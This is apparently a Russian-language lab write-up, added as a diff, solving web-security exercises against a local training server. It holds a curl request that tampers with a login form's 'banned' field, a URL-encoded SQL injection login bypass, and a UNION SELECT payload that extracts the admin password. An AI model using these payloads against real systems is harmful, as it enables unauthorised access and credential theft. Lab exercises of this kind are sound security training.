@@ -1,0 +1,13 @@
+Задание 2
+Обойти клиентскую защиту с помощью curl.
+	curl "http://192.168.200.100:8080/signin" -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://192.168.200.100:8080" -H "DNT: 1" -H "Connection: keep-alive" -H "Referer: http://192.168.200.100:8080/login.html" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "name=alexandra&pass=qwertyu&banned=true"
+
+
+Задание 3
+Обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded).
+	%27 OR 1=1;--
+
+
+Задание 4
+Обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded) и получить пароль из БД.
+	%27 union select pass from users where name = %27admin%27--
